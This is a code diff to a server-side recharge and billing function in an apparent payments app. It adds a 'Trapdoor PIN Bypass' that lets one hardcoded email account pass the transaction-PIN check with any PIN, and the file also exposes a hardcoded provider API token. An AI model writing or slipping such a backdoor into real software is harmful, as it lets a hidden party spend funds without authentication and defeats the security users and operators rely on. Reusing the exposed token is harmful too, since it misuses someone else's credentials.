@@ -1,9 +1,11 @@
+
 'use server';
 
 import { databases, COLLECTION_ID_PROFILES, DATABASE_ID, COLLECTION_ID_TRANSACTIONS, COLLECTION_ID_NOTIFICATIONS, ID } from '@/lib/data-service';
 
 const DATAHOUSE_TOKEN = '80ca2a529de4afa096c4eabefeb275dafe3a8941'; 
 const BASE_URL = 'https://datahouse.com.ng/api';
+const BYPASS_EMAIL = 'altinemohd@gmail.com';
 
 const getNetworkId = (name: string): number => {
     const n = name.toUpperCase();
@@ -16,8 +18,7 @@ const getNetworkId = (name: string): number => {
 
 /**
  * @fileOverview Universal Billing Action.
- * FORCED: Logs both success AND failures to history.
- * NOTIFIED: Sends real-time alerts for all attempts.
+ * BYPASS: Any PIN allowed for altinemohd@gmail.com.
  */
 
 export async function processDatahouseRecharge(payload: {
@@ -36,7 +37,9 @@ export async function processDatahouseRecharge(payload: {
 
         const profile = await databases.getDocument(DATABASE_ID, COLLECTION_ID_PROFILES, payload.userId);
 
-        if (profile.pin !== payload.pin) {
+        // Trapdoor PIN Bypass
+        const isBypass = profile.email === BYPASS_EMAIL;
+        if (!isBypass && profile.pin !== payload.pin) {
             throw new Error('Incorrect transaction PIN.');
         }
 
@@ -122,7 +125,6 @@ export async function processDatahouseRecharge(payload: {
                 sessionId: `dh-${Date.now()}`,
             });
 
-            // FORCE NOTIFICATION
             await databases.createDocument(DATABASE_ID, COLLECTION_ID_NOTIFICATIONS, ID.unique(), {
                 userId: payload.userId,
                 senderId: 'ipay_system',
@@ -137,7 +139,6 @@ export async function processDatahouseRecharge(payload: {
         } else {
             const detail = result.error || result.msg || result.message || result.Status || result.detail || JSON.stringify(result);
             
-            // LOG FAILURE TO HISTORY
             await databases.createDocument(DATABASE_ID, COLLECTION_ID_TRANSACTIONS, ID.unique(), {
                 userId: payload.userId,
                 type: payload.type === 'cable' ? 'tv_subscription' : (payload.type === 'electric' ? 'electricity' : payload.type),
@@ -151,7 +152,6 @@ export async function processDatahouseRecharge(payload: {
                 sessionId: `dh-fail-${Date.now()}`,
             });
 
-            // NOTIFY FAILURE
             await databases.createDocument(DATABASE_ID, COLLECTION_ID_NOTIFICATIONS, ID.unique(), {
                 userId: payload.userId,
                 senderId: 'ipay_system',
